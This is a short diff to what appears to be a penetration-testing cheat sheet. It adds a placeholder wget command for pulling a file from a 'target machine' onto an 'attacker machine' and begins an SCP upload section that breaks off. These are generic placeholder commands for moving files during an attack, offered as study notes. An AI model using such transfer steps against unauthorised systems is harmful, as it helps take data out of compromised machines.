@@ -138,7 +138,13 @@ ruby -run -ehttpd . -p8000
 
 #### Download File from Target Machine onto Attacker Machine
 ```bash
-wget 
+wget <IP>:<PORT>/<FILE TO TRANSFER>
+```
+
+---
+## Uploading File with SCP
+```bash
+scp <PATH TO FILE> 
 ```
 
 
